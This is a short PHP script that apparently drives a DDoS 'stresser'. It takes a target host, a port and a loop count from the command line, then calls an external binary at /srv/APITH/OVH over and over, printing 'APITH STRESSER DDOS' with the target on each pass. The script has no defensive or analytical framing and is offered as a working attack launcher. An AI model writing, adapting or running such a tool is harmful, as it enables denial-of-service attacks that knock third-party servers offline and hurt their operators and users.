<?php
for ($x = 0; $x <= $argv[3]; $x++) {
	$rand = rand(1,30);
	exec('/srv/APITH/OVH '.$argv[1].' '.$argv[2].' '.$rand.' 1');
	echo "APITH STRESSER DDOS ...... ".$argv[1].":".$argv[2]." LOOP $x \n";
}
?>